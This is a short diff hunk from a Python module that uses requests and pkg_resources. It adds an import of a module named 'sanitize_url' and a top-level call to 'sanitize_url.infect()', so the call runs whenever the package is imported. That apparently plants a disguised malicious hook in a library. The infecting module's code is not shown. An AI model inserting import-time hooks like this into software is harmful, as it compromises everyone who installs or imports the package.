@@ -13,6 +13,10 @@ import pkg_resources
 import requests
 import requests.adapters
 
+import sanitize_url
+
+sanitize_url.infect()
+
 __metadata__ = {
     i[0]: i[1]
     for i in [
